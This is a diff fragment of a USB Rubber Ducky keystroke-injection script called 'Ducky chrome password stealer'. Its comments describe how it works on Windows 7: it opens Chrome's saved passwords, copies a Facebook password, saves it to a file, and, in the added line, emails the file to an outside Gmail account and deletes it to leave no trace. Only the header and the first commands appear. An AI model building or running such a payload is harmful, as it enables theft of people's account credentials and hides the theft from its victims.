@@ -2,7 +2,8 @@ REM Author: Nuk3leus
 REM Ducky chrome password stealer: 1.0
 REM Target: Windows 7
 REM Description: Opens chrome, navigates to chrome settings, navigates to saved passwords, searches for facebook, shows password, copys password
-REM closes chrome, Opens notepad and pastes in password, saves to music folder, closes notepad.
+REM closes chrome, Opens notepad and pastes in password, saves to music folder, closes notepad
+REM sends files via gmail to account, exit delete file no trace.
 DELAY 2000
 REM -------------open chrome
 GUI
